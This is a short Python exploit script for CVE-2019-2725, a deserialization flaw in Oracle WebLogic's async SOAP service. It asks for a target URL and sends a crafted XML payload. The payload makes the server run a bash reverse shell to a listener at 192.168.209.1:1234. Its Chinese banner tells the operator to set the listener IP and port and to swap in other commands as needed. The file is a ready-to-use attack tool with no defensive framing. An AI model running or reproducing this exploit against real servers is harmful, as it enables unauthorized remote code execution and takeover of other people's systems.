cve-2019-2725.py

#coding:utf-8
#author：c0mpu7er
#Time :20190505
#CVE-2019-2725
import requests

banner='''
使用脚本前请修改url接口参数和payload监听IP地址和端口号
若需要其他命令的执行，请自行修改命令即可
反弹shell时间有延时，执行脚本后请等待一会儿即可！
脚本未作状态码检测，请先检查目标状态后执行脚本
'''
print banner
print "eg:http://192.168.209.134:49163/_async/AsyncResponseService:"
target=raw_input("please input target:")
headers = {
			"Content-Length": "783",
			"Accept-Encoding": "gzip,deflate",
			"SOAPAction":"",
			"Accept": "*/*",
			"User-Agent": "Apache-HttpClient/4.1.1 (java 1.5)",
			"Connection": "keep-alive",
			"content-type": "text/xml"
            }
 
payload ="<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:asy='http://www.bea.com/async/AsyncResponseService'><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work='http://bea.com/2004/06/soap/workarea/'><void class='java.lang.ProcessBuilder'><array class='java.lang.String' length='3'><void index='0'><string>/bin/bash</string></void><void index='1'><string>-c</string></void><void index='2'><string>bash -i >&amp; /dev/tcp/192.168.209.1/1234 0>&amp;1</string></void></array><void method='start'/></void></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>"
r = requests.post(target, json=payload, headers=headers,verify=False)
b = r.status_code
print "\n"
print r.headers
print "目标响应状态:"
print b
if b=="202":
	print "发送成功，请检查监听状况！"
else: 
	print "发送失败，URL不可达或者漏洞不存在!!!"
